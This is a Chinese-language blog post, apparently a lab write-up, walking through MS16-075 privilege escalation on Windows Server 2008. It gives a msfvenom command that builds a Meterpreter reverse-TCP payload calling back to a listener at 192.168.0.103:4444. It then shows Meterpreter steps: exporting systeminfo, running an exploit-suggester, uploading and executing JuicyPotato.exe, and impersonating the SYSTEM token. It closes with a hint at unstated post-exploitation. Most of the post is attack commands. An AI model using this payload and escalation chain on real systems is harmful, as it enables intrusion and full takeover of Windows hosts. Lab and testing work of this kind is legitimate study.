# ms-16075提权Windows Server 2008


>光看网上的文章是不够的，还是要多动手才行


#### ms16-075漏洞简介
Windows SMB 服务器特权提升漏洞（CVE漏洞编号：CVE-2016-3225）当攻击者转发适用于在同一计算机上运行的其他服务的身份验证请求时，Microsoft 服务器消息块 (SMB) 中存在特权提升漏洞，成功利用此漏洞的攻击者可以使用提升的特权执行任意代码。
漏洞详情，[请戳这里](https://docs.microsoft.com/zh-cn/security-updates/Securitybulletins/2016/ms16-075)




#### 开始动手
1.假设是msfvenom生成木马，目标执行了，监听会话，获得meterpreter会话权限

```bash
msfvenom -p windows/meterpreter_reverse_tcp lhost=192.168.0.103 lport=4444 -f exe > shell.exe
```

2.先看一下当前权限(确保我没有作弊)
![](http://image.xpshuai.cn/ms16075_download.png)

3.查看系统信息，并导出
```bash
# (进入cmd)
shell
chcp   65001     # 将编码格式改为utf-8中文
systeminfo >> c:\out.txt   将系统信息输出到out.txt文件
```

4.在meterpreter把结果文件下载到本地

```bash
download   D:\\xxxx\\upload\\out.txt   /tmp/out.txt    
```
![](http://image.xpshuai.cn/ms16075_download.png)



5.这里选择`Windows-Exploit-Suggeste`提权辅助工具，对结果文件在本地进行分析, 查找系统未打补丁有哪些
```
python windows-exploit-suggester.py --update
python windows-exploit-suggester.py -i out.txt -d 2020-05-09-mssb.xls -l  # -i是systeminfo的结果文件
```
![](http://image.xpshuai.cn/ms16075_poc.png)

可以看到可能存在ms16-075漏洞
![](http://image.xpshuai.cn/ms16075_in.png)


6.开始验证
```bash
# 上传ms16-075的exp: JuicyPotato.exe至靶机
upload /root/Desktop/JuicyPotato.exe  C:\\

execute -cH -f  C:\\JuicyPotato.exe    # 执行poc(前面已经把poc上传到目标了), 创建新的进程
impersonate_token "NT AUTHORITY\\SYSTEM"    # 窃取, 假冒目标主机上的可用令牌

```
![](http://image.xpshuai.cn/ms16075_in.png)

7.查看当前权限，提取成功
```bash
getuid                # 查看当前权限
```
![](http://image.xpshuai.cn/ms16075_ok.png)


8.后面的事情，嘿嘿你懂得



>这里只是没有防护的情况下的一次简单实验，有点简陋有点水





---

> 作者: [剑胆琴心](http://geoer.cn)  
> URL: https://geoer.cn/ms-16075%E6%8F%90%E6%9D%83windows-server-2008/  

